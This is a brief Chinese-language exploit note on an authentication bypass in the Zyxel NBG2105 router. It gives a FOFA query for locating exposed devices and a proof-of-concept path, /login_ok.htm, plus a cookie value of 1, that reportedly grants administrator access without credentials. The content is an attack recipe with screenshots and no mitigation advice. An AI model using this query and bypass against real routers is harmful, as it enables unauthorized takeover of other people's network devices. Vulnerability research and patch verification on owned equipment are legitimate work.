# Zyxel NBG2105身份验证绕过

# 一、漏洞简介
在Zyxel NBG2105 V1.00（AAGU.2）C0设备上，将登录cookie设置为1可提供管理员访问权限。

# 二、影响版本
+ Zyxel NBG2105

# 三、资产测绘
+ fofa`app="ZyXEL-NBG2105"`
+ 特征

![1696166434348-7921a2e3-c0d4-41ac-8c65-ea4a29f88c1b.png](./img/8b_DE99WV4FLOPh1/1696166434348-7921a2e3-c0d4-41ac-8c65-ea4a29f88c1b-935700.png)

# 四、漏洞复现
直接访问如下poc即可绕过身份验证进入后台

```plain
/login_ok.htm
```

![1696166524962-f85cc736-9d74-4e94-a204-90dfd7dc8829.png](./img/8b_DE99WV4FLOPh1/1696166524962-f85cc736-9d74-4e94-a204-90dfd7dc8829-508453.png)



> 更新: 2024-02-29 23:57:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ofagy15qnxr8eg9f>